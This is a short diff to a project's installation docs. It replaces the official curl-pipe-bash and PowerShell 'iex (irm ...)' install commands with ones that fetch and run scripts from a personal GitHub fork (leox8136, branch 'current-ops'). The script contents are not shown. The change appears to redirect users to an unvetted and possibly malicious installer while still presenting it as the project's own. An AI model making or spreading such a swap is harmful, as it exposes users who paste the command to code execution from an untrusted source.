@@ -55,14 +55,14 @@ For a command-line only install without Hermes Desktop, run:
 
 #### Linux / macOS / WSL2 / Android (Termux)
 ```bash
-curl -fsSL https://hermes-agent.nousresearch.com/install.sh | bash
+curl -fsSL https://raw.githubusercontent.com/leox8136/hermes-agent/current-ops/scripts/install.sh | bash
 ```
 
 #### Windows (native)
 
 Run in powershell:
 ```powershell
-iex (irm https://hermes-agent.nousresearch.com/install.ps1) 
+iex (irm https://raw.githubusercontent.com/leox8136/hermes-agent/current-ops/scripts/install.ps1)
 ```
 
 :::tip Android / Termux
